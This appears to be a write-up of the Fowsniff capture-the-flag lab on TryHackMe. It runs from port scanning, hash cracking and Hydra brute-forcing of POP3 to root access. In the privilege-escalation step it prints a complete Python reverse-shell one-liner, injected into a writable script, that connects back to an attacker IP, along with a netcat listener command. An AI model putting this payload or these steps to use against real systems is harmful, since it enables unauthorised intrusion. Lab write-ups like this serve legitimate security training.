---
title: Fowsniff CTF
category: Privilege Escalation
difficulty: Easy
tags: [nmap, hydra, pop3, ssh, privilege escalation, reverse shell]
platform: TryHackMe
year: 2025
date: 2025-10-25
---

# Fowsniff CTF (2025)

## 📝 Description

This challenge involves a full penetration test, from initial port scanning to gaining root access. The path requires finding leaked credentials on GitHub, cracking MD5 hashes, using Hydra to gain POP3 access, finding an SSH password in an email, and finally escalating privileges by injecting a reverse shell into a misconfigured script.

---

## 🔍 Initial Recon

| Item                  | Notes                                                                                                    |
| :-------------------- | :------------------------------------------------------------------------------------------------------- |
| **Files provided**    | None                                                                                                     |
| **Services / Ports**  | 22/tcp (ssh), 80/tcp (http), 110/tcp (pop3), 143/tcp (imap)                                              |
| **Hints given**       | The HTTP web page mentioned a data leak                                                                  |
| **Observed behavior** | The data leak hint led to a GitHub page containing usernames and their corresponding MD5 password hashes |

---

## 🛠️ Approach

### Step 1: Initial Access via POP3

* Followed the website hint about a data leak which led to a GitHub page with leaked usernames and MD5 hashes.
* Used an online hash cracker to decrypt the MD5 hashes to probable passwords.
* With the list of usernames and candidate passwords, used **Hydra** to brute-force the POP3 service on port 110.
* Hydra revealed a valid credential pair: `seina:scoobydoo2`.

### Step 2: Discovering SSH Credentials

* Connected to POP3 with `nc 10.201.99.253 110` to retrieve mail.
* Retrieved and read two emails (`RETR 1`, `RETR 2`).

  * The first email (from A.J. Stone) mentioned access to a temporary SSH server and provided a temporary password: `S1ck3nBluff+secureshell`.
  * The second email confirmed other usernames including `baksteen`.
* Used username `baksteen` with the temporary password to log in via SSH.

### Step 3: Privilege Escalation

* Once logged in as `baksteen`, searched for files with group-execute permissions relevant to user's groups.
* Found an interesting script: `/opt/cube/cube.sh`.
* Edited the script to insert a Python reverse shell payload that connects back to the attacker machine (`10.17.21.245:1234`).

**Payload added to `cube.sh`:**

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.21.245",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Step 4: Gaining Root

* On the attacker machine, set up a netcat listener: `nc -lvp 1234`.
* Triggered the execution of the `cube.sh` script (by logging out/in or waiting for the service to run it).
* The listener received a connection from the victim machine.
* Ran `id` on the received shell and confirmed root: `uid=0(root) gid=0(root) groups=0(root)`.

---

## 🔬 Flag

With root, navigated to `/root`, listed files, and read `flag.txt`. The file contained the root flag and a small message (ASCII art):

```
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (_ / _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by 
@berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```